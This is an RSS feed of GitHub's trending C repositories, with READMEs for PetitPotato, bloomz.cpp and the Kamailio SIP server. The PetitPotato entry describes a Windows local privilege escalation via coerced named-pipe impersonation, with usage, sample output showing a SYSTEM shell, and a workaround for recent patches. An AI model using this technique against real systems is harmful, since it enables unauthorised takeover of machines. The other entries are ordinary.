<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-03-18T01:30:57Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>wh0amitz/PetitPotato</title>
    <updated>2023-03-18T01:30:57Z</updated>
    <id>tag:github.com,2023-03-18:/wh0amitz/PetitPotato</id>
    <link href="https://github.com/wh0amitz/PetitPotato" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Local privilege escalation via PetitPotam (perfectly on Windows 21H2 10.0.20348.1547)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PetitPotato&lt;/h1&gt; &#xA;&lt;p&gt;Local privilege escalation via PetitPotam (Abusing impersonate privileges).&lt;/p&gt; &#xA;&lt;h2&gt;Description&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/topotam/PetitPotam&#34;&gt;PetitPotam&lt;/a&gt; uses MS-EFSR (Encrypting File System Remote), a protocol used to perform maintenance and management operations on encrypted data stored remotely and accessed over a network. There are a series of APIs similar to &lt;code&gt;EfsRpcOpenFileRaw&lt;/code&gt; in MS-EFSR. The syntax of the &lt;code&gt;EfsRpcOpenFileRaw&lt;/code&gt; API is shown below.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;long EfsRpcOpenFileRaw(&#xA;   [in] handle_t binding_h,&#xA;   [out] PEXIMPORT_CONTEXT_HANDLE* hContext,&#xA;   [in, string] wchar_t* FileName,&#xA;   [in] long Flags&#xA; );&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Such APIs can specify a UNC path via the FileName parameter to open encrypted objects on the server for backup or restore. When the path in the format &lt;code&gt;\\IP\C$&lt;/code&gt; is specified, the lsass.exe service will access &lt;code&gt;\\IP\pipe\srvsvc&lt;/code&gt; with &lt;code&gt;NT AUTHORITY SYSTEM&lt;/code&gt; account privileges.&lt;/p&gt; &#xA;&lt;p&gt;If we can call the &lt;code&gt;EfsRpcOpenFileRaw&lt;/code&gt; API to force the local computer to connect to the malicious named pipe we created, then we can impersonate the named pipe client process and eventually gain the SYSTEKM privilege.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PetitPotato.exe [EfsID] [Command]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;EfsID&lt;/code&gt;: MS-EFSR API number to use&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Command&lt;/code&gt;: command to execute&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Example&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Administrator\Desktop&amp;gt;PetitPotato.exe 3 cmd.exe&#xA;&#xA;[+] Malicious named pipe running on \\.\pipe\petit\pipe\srvsvc.&#xA;[+] Invoking EfsRpcQueryUsersOnFile with target path: \\localhost/pipe/petit\C$\wh0nqs.txt.&#xA;[+] The connection is successful.&#xA;[+] ImpersonateNamedPipeClient OK.&#xA;[+] OpenThreadToken OK.&#xA;[+] DuplicateTokenEx OK.&#xA;[+] CreateProcessAsUser OK.&#xA;Microsoft Windows [Version 10.0.20348.1547]&#xA;(c) Microsoft Corporation. All rights reserved.&#xA;&#xA;C:\Windows\system32&amp;gt;whoami&#xA;nt authority\system&#xA;&#xA;C:\Windows\system32&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/PetitPotato/master/images/image-20221030165055659.png&#34; alt=&#34;image-20221030165055659&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/PetitPotato/master/images/image-20221030165622668.png&#34; alt=&#34;image-20221030165622668&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Update on 2023/03/14&lt;/h2&gt; &#xA;&lt;p&gt;PetitPotam does not work on newer versions of Windows due to the limitations of related patches. However, setting AuthnLevel to &lt;code&gt;RPC_C_AUTHN_LEVEL_PKT_PRIVACY&lt;/code&gt; via &lt;code&gt;RpcBindingSetAuthInfoW&lt;/code&gt; before calling EFS works on latest systems.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;In December 2021, Microsoft released a patch for a different EFSRPC vulnerability: CVE-2021-43217. As part of the remediation for that issue, Microsoft implemented some hardening measures on EFSRPC communication. In particular, EFSRPC clients would need to use RPC_C_AUTHN_LEVEL_PKT_PRIVACY when using EFSRPC. If the client fails to do so, then the client is rejected and a Windows application event is generated.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;At present, the project can perfectly elevate to SYSTEM on Windows 21H2 10.0.20348.1547.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/PetitPotato/master/images/image-20221030165155659.png&#34; alt=&#34;image-20221030165055659&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Link&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/topotam/PetitPotam&#34;&gt;https://github.com/topotam/PetitPotam&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&#34;&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://itm4n.github.io/from-rpcview-to-petitpotam/&#34;&gt;https://itm4n.github.io/from-rpcview-to-petitpotam/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/zcgonvh/EfsPotato/pull/5&#34;&gt;https://github.com/zcgonvh/EfsPotato/pull/5&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>NouamaneTazi/bloomz.cpp</title>
    <updated>2023-03-18T01:30:57Z</updated>
    <id>tag:github.com,2023-03-18:/NouamaneTazi/bloomz.cpp</id>
    <link href="https://github.com/NouamaneTazi/bloomz.cpp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;C++ implementation for BLOOM&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;bloomz.cpp&lt;/h1&gt; &#xA;&lt;p&gt;Inference of HuggingFace&#39;s &lt;a href=&#34;https://huggingface.co/docs/transformers/model_doc/bloom&#34;&gt;BLOOM-like&lt;/a&gt; models in pure C/C++.&lt;/p&gt; &#xA;&lt;p&gt;The repo was built on top of the amazing &lt;a href=&#34;https://github.com/ggerganov/llama.cpp&#34;&gt;llama.cpp&lt;/a&gt; repo by &lt;a href=&#34;https://github.com/ggerganov&#34;&gt;@ggerganov&lt;/a&gt;, to support &lt;a href=&#34;https://huggingface.co/docs/transformers/model_doc/bloom&#34;&gt;BLOOM&lt;/a&gt; models. It supports all models that can be loaded using &lt;code&gt;BloomForCausalLM.from_pretrained()&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/NouamaneTazi/bloomz.cpp/main/assets/bloomz-demo.png&#34; alt=&#34;bloomz-7b1&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Demo&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/NouamaneTazi/bloomz.cpp/main/assets/bloomz-7b1.gif&#34; alt=&#34;bloomz-7b1&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;First, you need to clone the repo and build it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/NouamaneTazi/bloomz.cpp&#xA;cd bloomz.cpp&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, you can convert any BLOOM model from the Hub to the ggml format.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# install required libraries&#xA;python3 -m pip install torch numpy transformers&#xA;&#xA;# download and convert the 7B1 model to ggml FP16 format&#xA;python3 convert-hf-to-ggml.py bigscience/bloomz-7b1 ./models &#xA;# Note: you can add --use-f32 to convert to FP32 instead of FP16&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Optionally, you can quantize the model to 4-bits.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./quantize ./models/ggml-model-bloomz-7b1-f16.bin ./models/ggml-model-bloomz-7b1-f16-q4_0.bin 2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, you can run the inference.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./main -m ./models/ggml-model-bloomz-7b1-f16-q4_0.bin -t 8 -n 128&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Your output should look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make &amp;amp;&amp;amp; ./main -m models/ggml-model-bloomz-7b1-f16-q4_0.bin  -p &#39;Translate &#34;Hi, how are you?&#34; in French:&#39; -t 8 -n 256&#xA;&#xA;I llama.cpp build info: &#xA;I UNAME_S:  Darwin&#xA;I UNAME_P:  arm&#xA;I UNAME_M:  arm64&#xA;I CFLAGS:   -I.              -O3 -DNDEBUG -std=c11   -fPIC -pthread -DGGML_USE_ACCELERATE&#xA;I CXXFLAGS: -I. -I./examples -O3 -DNDEBUG -std=c++11 -fPIC -pthread&#xA;I LDFLAGS:   -framework Accelerate&#xA;I CC:       Apple clang version 13.1.6 (clang-1316.0.21.2.5)&#xA;I CXX:      Apple clang version 13.1.6 (clang-1316.0.21.2.5)&#xA;&#xA;make: Nothing to be done for `default&#39;.&#xA;main: seed = 1678899845&#xA;llama_model_load: loading model from &#39;models/ggml-model-bloomz-7b1-f16-q4_0.bin&#39; - please wait ...&#xA;llama_model_load: n_vocab = 250880&#xA;llama_model_load: n_ctx   = 512&#xA;llama_model_load: n_embd  = 4096&#xA;llama_model_load: n_mult  = 1&#xA;llama_model_load: n_head  = 32&#xA;llama_model_load: n_layer = 30&#xA;llama_model_load: f16     = 2&#xA;llama_model_load: n_ff    = 16384&#xA;llama_model_load: n_parts = 1&#xA;llama_model_load: ggml ctx size = 5312.64 MB&#xA;llama_model_load: memory_size =   480.00 MB, n_mem = 15360&#xA;llama_model_load: loading model part 1/1 from &#39;models/ggml-model-bloomz-7b1-f16-q4_0.bin&#39;&#xA;llama_model_load: ............................................. done&#xA;llama_model_load: model size =  4831.16 MB / num tensors = 366&#xA;&#xA;main: prompt: &#39;Translate &#34;Hi, how are you?&#34; in French:&#39;&#xA;main: number of tokens in prompt = 11&#xA;153772 -&amp;gt; &#39;Translate&#39;&#xA; 17959 -&amp;gt; &#39; &#34;H&#39;&#xA;    76 -&amp;gt; &#39;i&#39;&#xA; 98257 -&amp;gt; &#39;, &#39;&#xA; 20263 -&amp;gt; &#39;how&#39;&#xA;  1306 -&amp;gt; &#39; are&#39;&#xA;  1152 -&amp;gt; &#39; you&#39;&#xA;  2040 -&amp;gt; &#39;?&#39;&#xA;     5 -&amp;gt; &#39;&#34;&#39;&#xA;   361 -&amp;gt; &#39; in&#39;&#xA;196427 -&amp;gt; &#39; French:&#39;&#xA;&#xA;sampling parameters: temp = 0.800000, top_k = 40, top_p = 0.950000, repeat_last_n = 64, repeat_penalty = 1.300000&#xA;&#xA;&#xA;Translate &#34;Hi, how are you?&#34; in French: Bonjour, comment ça va?&amp;lt;/s&amp;gt; [end of text]&#xA;&#xA;&#xA;main: mem per token = 24017564 bytes&#xA;main:     load time =  3092.29 ms&#xA;main:   sample time =     2.40 ms&#xA;main:  predict time =  1003.04 ms / 59.00 ms per token&#xA;main:    total time =  5307.23 ms&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Advanced usage&lt;/h2&gt; &#xA;&lt;p&gt;Here&#39;s a list of the available options:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;usage: ./main [options]&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  -s SEED, --seed SEED  RNG seed (default: -1)&#xA;  -t N, --threads N     number of threads to use during computation (default: 4)&#xA;  -p PROMPT, --prompt PROMPT&#xA;                        prompt to start generation with (default: random)&#xA;  -n N, --n_predict N   number of tokens to predict (default: 128)&#xA;  --top_k N             top-k sampling (default: 40)&#xA;  --top_p N             top-p sampling (default: 0.9)&#xA;  --repeat_last_n N     last n tokens to consider for penalize (default: 64)&#xA;  --repeat_penalty N    penalize repeat sequence of tokens (default: 1.3)&#xA;  --temp N              temperature (default: 0.8)&#xA;  -b N, --batch_size N  batch size for prompt processing (default: 8)&#xA;  -m FNAME, --model FNAME&#xA;                        model path (default: models/ggml-model-bloomz-7b1-f16-q4_0.bin)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Memory usage&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Model&lt;/th&gt; &#xA;   &lt;th&gt;Disk&lt;/th&gt; &#xA;   &lt;th&gt;Mem&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;code&gt;bloomz-7b1-f16-q4_0&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;4.7 GB&lt;/td&gt; &#xA;   &lt;td&gt;5.3 GB&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;iOS App&lt;/h2&gt; &#xA;&lt;p&gt;The repo includes a proof-of-concept iOS app in the &lt;code&gt;Bloomer&lt;/code&gt; directory. You need to provide the converted model weights, placing a file called &lt;code&gt;ggml-model-bloomz-560m-f16.bin&lt;/code&gt; inside that folder. This is what it looks like on an iPhone:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/NouamaneTazi/bloomz.cpp/main/assets/bloom-ios.png&#34; alt=&#34;bloom-ios-screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Known issues and limitations:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;No feedback during generation, the full generated text is displayed at once upon termination.&lt;/li&gt; &#xA; &lt;li&gt;The model is loaded from disk every time you submit a new string for completion.&lt;/li&gt; &#xA; &lt;li&gt;Performance is much worse when testing on the simulator than when running the native binary. There could be some compiler options that might be impacting performance.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>kamailio/kamailio</title>
    <updated>2023-03-18T01:30:57Z</updated>
    <id>tag:github.com,2023-03-18:/kamailio/kamailio</id>
    <link href="https://github.com/kamailio/kamailio" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Kamailio - The Open Source SIP Server for large VoIP and real-time communication platforms -&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Kamailio - The Open Source SIP Server&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/kamailio/kamailio/actions&#34;&gt;&lt;img src=&#34;https://github.com/kamailio/kamailio/actions/workflows/main.yml/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.codetriage.com/kamailio/kamailio&#34;&gt;&lt;img src=&#34;https://www.codetriage.com/kamailio/kamailio/badges/users.svg?sanitize=true&#34; alt=&#34;Code Triage Badge&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Project Website:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org&#34;&gt;https://www.kamailio.org&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.kamailio.org/w/2021/09/kamailio-20-years-of-development/&#34;&gt;20 Years Of Kamailio Development: Sep 3, 2001 - Sep 3, 2021&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;Kamailio is an open source implementation of a SIP Signaling Server. SIP is an open standard protocol specified by the IETF. The core specification document is &lt;a href=&#34;https://tools.ietf.org/html/rfc3261&#34;&gt;RFC3261&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The Kamailio SIP server is designed for scalability, targeting large deployments (e.g. for IP telephony operators or carriers, which have a large subscriber base or route a big volume of calls), but can be also used in enterprises or for personal needs to provide VoIP, Instant Messaging and Presence. Kamailio is well known for its flexibility, robustness, strong security and the extensive number of features - for more information, please see:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/w/features/&#34;&gt;https://www.kamailio.org/w/features/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Kamailio development was started back in 2001 by &lt;a href=&#34;https://www.fokus.fraunhofer.de/&#34;&gt;Fraunhofer Fokus&lt;/a&gt;, a research institute in Berlin, Germany. At that time the project name was SIP Express Router (aka SER). In 2005, a fork named OpenSER was created, which was renamed to Kamailio in July 2008 due to trademark issues. Starting in the autumn of 2008, Kamailio and SER initiated the process to merge the two projects. After the merge was complete, Kamailio became the main name of the project, being better protected in terms of trademarks.&lt;/p&gt; &#xA;&lt;p&gt;Fraunhofer Fokus is no longer actively involved in the evolution of the project. Kamailio is now developed and managed by its world wide community. Fokus still uses Kamailio in its research projects (such as OpenIMSCore) and it is hosting events related to the project, such as developer meetings or the Kamailio World Conference.&lt;/p&gt; &#xA;&lt;p&gt;For more information about Kamailio, see the &lt;a href=&#34;https://www.kamailio.org&#34;&gt;website of the project&lt;/a&gt;, where you can find pointers to documentation, the project wiki and much more.&lt;/p&gt; &#xA;&lt;h2&gt;Contributions&lt;/h2&gt; &#xA;&lt;p&gt;Github pull requests are the recommended way to contribute to Kamailio source code or documentation:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kamailio/kamailio/pulls&#34;&gt;https://github.com/kamailio/kamailio/pulls&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To keep a coherent and consistent history of the development, the commit messages format and content must follow the rules detailed at:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/wikidocs/devel/github-contributions&#34;&gt;https://www.kamailio.org/wikidocs/devel/github-contributions&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Contributions must conform with licensing rules of the Kamailio project.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Main License: GPLv2.&lt;/p&gt; &#xA;&lt;p&gt;Each source code file refers to the license and copyright details in the top of the file. Most of the code is licensed under GPLv2, some parts of the code are licensed under BSD.&lt;/p&gt; &#xA;&lt;h3&gt;License Of New Code Contributions&lt;/h3&gt; &#xA;&lt;p&gt;New contributions to the core and several main modules (auth, corex, sl, tls, tm) have to be done under the BSD license. New contributions under the GPL must grant the GPL-OpenSSL linking exception. Contributions to existing components released under BSD must be done under BSD as well.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;The main index for documentation is available at:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/w/documentation/&#34;&gt;https://www.kamailio.org/w/documentation/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The online documentation for modules in the latest stable branch:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://kamailio.org/docs/modules/stable/&#34;&gt;https://kamailio.org/docs/modules/stable/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The wiki collects a consistent number of tutorials, the indexes for variables, functions and parameters:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/wikidocs/&#34;&gt;https://www.kamailio.org/wikidocs/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please read the README file in the source code, one per module.&lt;/p&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;p&gt;Step by step tutorials to install Kamailio from source code are available at:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/wikidocs/#installation&#34;&gt;https://www.kamailio.org/wikidocs/#installation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please read the INSTALL file from the source code for more information.&lt;/p&gt; &#xA;&lt;p&gt;Repositories for Linux packages:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;deb: &lt;a href=&#34;https://www.kamailio.org/wikidocs/packages/debs&#34;&gt;https://www.kamailio.org/wikidocs/packages/debs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;rpm: &lt;a href=&#34;https://www.kamailio.org/wikidocs/packages/rpms&#34;&gt;https://www.kamailio.org/wikidocs/packages/rpms&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Issues And Bug Reports&lt;/h2&gt; &#xA;&lt;p&gt;To report a bug or make a request for new features, use the Issues Page in the Kamailio Github project:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kamailio/kamailio/issues&#34;&gt;https://github.com/kamailio/kamailio/issues&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Open Support And Community Discussions&lt;/h2&gt; &#xA;&lt;h3&gt;Mailing Lists&lt;/h3&gt; &#xA;&lt;p&gt;Mailing list for discussions regarding stable versions of Kamailio:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;sr-users (at) lists.kamailio.org&lt;/strong&gt; - &lt;a href=&#34;https://lists.kamailio.org/mailman3/postorius/lists/sr-users.lists.kamailio.org/&#34;&gt;sr-users web page&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Mailing list for discussions regarding the development of Kamailio and the state of master (devel) branch:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;sr-dev (at) lists.kamailio.org&lt;/strong&gt; - &lt;a href=&#34;https://lists.kamailio.org/mailman3/postorius/lists/sr-dev.lists.kamailio.org/&#34;&gt;sr-dev web page&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Mailing list for discussions with commercial purpose:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;business (at) lists.kamailio.org&lt;/strong&gt; - &lt;a href=&#34;https://lists.kamailio.org/mailman3/postorius/lists/business.lists.kamailio.org/&#34;&gt;business web page&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For more information about the mailing lists, please see:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/w/mailing-lists/&#34;&gt;https://www.kamailio.org/w/mailing-lists/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;IRC Channel&lt;/h3&gt; &#xA;&lt;p&gt;An open IRC discussion channel is managed by the community:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;irc server: irc.freenode.net&lt;/li&gt; &#xA; &lt;li&gt;irc channel: #kamailio&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Matrix Channel&lt;/h3&gt; &#xA;&lt;p&gt;An open Matrix discussion channel is managed by the community:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;server: &lt;a href=&#34;https://riot.kamailio.dev/&#34;&gt;https://riot.kamailio.dev/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Room: &lt;a href=&#34;https://riot.kamailio.dev/#/room/#kamailio:matrix.kamailio.dev&#34;&gt;https://riot.kamailio.dev/#/room/#kamailio:matrix.kamailio.dev&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Useful Resources&lt;/h2&gt; &#xA;&lt;p&gt;News:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/w/category/news/&#34;&gt;https://www.kamailio.org/w/category/news/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Twitter @kamailio&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Travis-CI - Testing Build Environment&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://travis-ci.org/kamailio/kamailio/builds/&#34;&gt;travis-ci&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/kamailio/kamailio/master/test/travis/README.md&#34;&gt;docker build&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Thank you for flying Kamailio!&lt;/strong&gt;&lt;/p&gt;</summary>
  </entry>
</feed>